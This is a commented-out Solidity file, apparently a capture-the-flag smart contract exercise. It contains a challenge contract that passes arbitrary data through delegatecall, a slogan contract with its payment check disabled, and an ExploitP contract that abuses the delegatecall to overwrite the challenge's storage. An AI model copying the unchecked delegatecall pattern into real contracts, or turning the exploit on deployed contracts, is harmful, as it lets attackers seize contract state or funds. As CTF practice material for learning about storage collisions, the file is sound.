// // SPDX-License-Identifier: MIT
// pragma solidity >=0.8.2;

// contract ChallengeP {
//     address public sloganContract; // sloganproxy

//     constructor(address _contract) payable {
//         sloganContract = _contract;
//     }

//     function callSloganContract(bytes memory data) public payable {
//         require((sloganContract) != address(0)); // require pass ez
//         (bool success, ) = (sloganContract).delegatecall(data); // call the proxy with 0.001 ether to set slogan
//         require(success, "call failed!");
//     }
// }

// contract SloganP {
//     string public slogan;
//     address public currentSloganOwner;

//     function setSlogan(string memory _str) public payable returns (bool) {
//         //require(msg.value == 0.001 ether);
//         slogan = _str;
//         currentSloganOwner = msg.sender;
//         return true;
//     }
// }

// contract Temp {
//     address public owner; // sloganproxy

//     constructor(address _contract) payable {
//         owner = _contract;
//     }

//     function callSloganContract(address slogan, string memory _str)
//         public
//         payable
//     {
//         bytes memory data = abi.encodeWithSignature("setSlogan(string)", _str);
//         (bool success, ) = slogan.delegatecall(data); // call the proxy with 0.001 ether to set slogan
//         require(success, "call failed!");
//     }

//     function getData(string memory _str) public returns (bytes memory data) {
//         return abi.encodeWithSignature("setSlogan(string)", _str);
//     }
// }

// contract ExploitP {
//     function exploit(address _challenge, string memory _str) public payable {
//         //require(msg.value == 0.001 ether);
//         //string memory _str = toString(address(this));
//         ChallengeP challenge = ChallengeP(_challenge);
//         bytes memory data = abi.encodeWithSignature("setSlogan(string)", _str);
//         challenge.callSloganContract(data);
//     }

//     function toString(address account) public pure returns (string memory) {
//         return toString(abi.encodePacked(account));
//     }

//     function toString(uint256 value) public pure returns (string memory) {
//         return toString(abi.encodePacked(value));
//     }

//     function toString(bytes32 value) public pure returns (string memory) {
//         return toString(abi.encodePacked(value));
//     }

//     function toString(bytes memory data) public pure returns (string memory) {
//         bytes memory alphabet = "0123456789abcdef";

//         bytes memory str = new bytes(2 + data.length * 2);
//         str[0] = "0";
//         str[1] = "x";
//         for (uint256 i = 0; i < data.length; i++) {
//             str[2 + i * 2] = alphabet[uint256(uint8(data[i] >> 4))];
//             str[3 + i * 2] = alphabet[uint256(uint8(data[i] & 0x0f))];
//         }
//         return string(str);
//     }
// }
